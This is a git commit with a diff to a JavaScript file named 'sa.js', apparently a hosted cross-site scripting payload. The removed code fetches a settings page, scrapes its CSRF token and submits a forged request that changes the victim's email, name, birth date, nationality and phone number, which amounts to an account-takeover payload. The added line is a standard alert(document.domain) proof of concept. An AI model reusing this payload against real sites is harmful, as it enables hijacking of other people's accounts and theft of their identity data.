a88a3b8f61ea6937850c3fc673de5f3a5d295410
ispomael <ispomael@gmail.com>
2025-07-24 17:54:45 +0200

    Update sa.js

--- sa.js
+++ sa.js
@@ -1,10 +1,1 @@
-var req = new XMLHttpRequest();
-req.onload = handleResponse;
-req.open('get','/settings/general',true);
-req.send();
-function handleResponse() {
-    var token = this.responseText.match(/name="csrf-token" content="(\w+)"/)[1];
-    var changeReq = new XMLHttpRequest();
-    changeReq.open('post', '/settings/general', true);
-    changeReq.send('_token='+token+'&email=testaa@testaaa.com&_method=PUT&last_name=Ahauka&first_name=Makuri&date_de_naissance=1992-11-05&nationalite=BE&phone=0499999999')
-};
+alert(document.domain);
